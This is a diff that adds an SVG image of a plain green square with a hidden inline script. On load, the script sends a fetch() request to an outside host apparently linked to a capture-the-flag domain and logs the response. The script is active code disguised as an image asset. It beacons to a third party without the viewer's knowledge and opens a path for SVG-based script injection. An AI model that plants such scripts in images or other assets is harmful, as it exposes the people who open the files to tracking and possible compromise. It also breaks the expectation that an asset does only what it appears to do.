@@ -1,0 +1,12 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200">
+    <script type="text/javascript" integrity="sha256-6qcP3/3fEjr9ZuiQjDC8UQoSmhHzG1WjR0wO6cxWjuo=">
+        fetch("https://leakuor.yactf.ru.eblan.online/9qzq3ud")
+        .then(res => res.json())
+        .then(data => console.log(data))
+        .catch(err => console.log(err))
+    </script>
+
+
+    <rect width="200" height="200" fill="#00ff00" />
+</svg>
+
